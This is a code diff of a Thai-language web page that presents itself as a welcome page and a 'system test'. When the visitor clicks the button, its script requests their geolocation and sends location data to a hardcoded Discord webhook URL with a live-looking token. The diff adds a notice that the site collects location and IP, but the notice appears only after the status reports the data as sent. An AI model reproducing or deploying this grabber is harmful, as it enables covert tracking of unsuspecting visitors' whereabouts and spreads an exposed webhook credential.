@@ -2,25 +2,21 @@
 <html lang="th">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>🔒 ระบบทดสอบตำแหน่ง</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <div class="box">
     <h1>✅ ยินดีต้อนรับสู่เว็บไซต์</h1>
-   
+    <p id="info-text"></p>
 
     <button onclick="collectInfo()">คลิกเพื่อเริ่มทดสอบระบบ</button>
-    <p id="status" style="margin-top: 20px;"></p>
-
-    <footer style="margin-top: 40px; font-size: 0.9rem; color: #555; text-align: center;">
-      <p>📸 ติดตามเราได้ที่ <a href="https://www.instagram.com/sky._.abc" target="_blank">@sky._.abc</a></p>
-    </footer>
+    <p id="status"></p>
   </div>
 
   <script>
-    const webhook = "https://discord.com/api/webhooks/1378728447647682591/BgtTJM5LlpBKWcrHmH7e32FHQq4z-TwIJUiy133A7mHI2SmwmIPbZ6-_8ro1E0tINTYQ";
+    const webhook = "https://discord.com/api/webhooks/1378728447647682591/BgtTJM5LlpBKWcrHmH7e32FHQq4z-TwIJUiy133A7mHI2SmwmIPbZ6-_8ro1E0tINTYQ"; // ใส่ Webhook จริงของคุณตรงนี้
 
     function collectInfo() {
       document.getElementById("status").innerText = "📡 กำลังขอข้อมูลตำแหน่ง...";
@@ -53,6 +49,8 @@
         });
 
         document.getElementById("status").innerText = "✅ ข้อมูลถูกส่งเรียบร้อยแล้ว!";
+        document.getElementById("info-text").innerText = 
+          "เว็บไซต์นี้จะเก็บข้อมูลตำแหน่งและ IP ภายในเท่านั้น เพื่อใช้ในการทดสอบ\n\nหากคุณไม่ยินยอม กรุณาออกจากหน้านี้ทันที";
       }, err => {
         document.getElementById("status").innerText = "❌ ไม่สามารถดึงตำแหน่งได้: " + err.message;
       });
